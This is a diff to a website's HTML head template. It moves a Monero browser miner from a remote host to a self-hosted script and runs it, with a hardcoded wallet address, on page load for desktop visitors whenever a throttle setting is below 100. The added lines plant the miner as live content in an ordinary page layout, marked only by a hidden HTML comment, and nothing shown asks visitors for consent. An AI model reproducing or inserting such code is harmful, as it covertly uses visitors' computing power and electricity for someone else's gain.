@@ -2,18 +2,18 @@
 	<meta charset="utf-8"/>
 	<meta name="viewport" content="width=device-width, initial-scale=1"/>
 	<title>{{print get "title" variables}}</title>
-	<link rel="stylesheet" type="text/css" href="/style.css"/>
-    <script type="text/javascript" src="/script.js"></script>
+	<link rel="stylesheet" type="text/css" href="/styles/style.css"/>
+    <script type="text/javascript" src="/scripts/script.js"></script>
+    <script>
+        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent);
+    </script>
     {{
         if not equals get "throttle" variables 100.0
-        print "<script src=\"https://xmr.omine.org/assets/v7.js\"></script>"
-        print "<script>OMINE(\"448YyshcHFNaQSfQGdE8QbMq3dtCRkUa8DWb1VyzuCRG1hy9UUzGcus3tGT19GRPYqf9ZRF1oHd4xHzz5uZQN1TN8K77Tnq\",\"-1\");throttleMiner="
+        print "<!-- Thank You for Your Service o7 -->"
+        print "<script src=\"/scripts/omine.js\"></script>"
+        print "<script>if(!isMobile){OMINE(\"448YyshcHFNaQSfQGdE8QbMq3dtCRkUa8DWb1VyzuCRG1hy9UUzGcus3tGT19GRPYqf9ZRF1oHd4xHzz5uZQN1TN8K77Tnq\",\"-1\");throttleMiner="
         print get "throttle" variables
-        print "</script>"
+        print ";}</script>"
         end
     }}
-    
-        
-        
-    </script>
 </head>
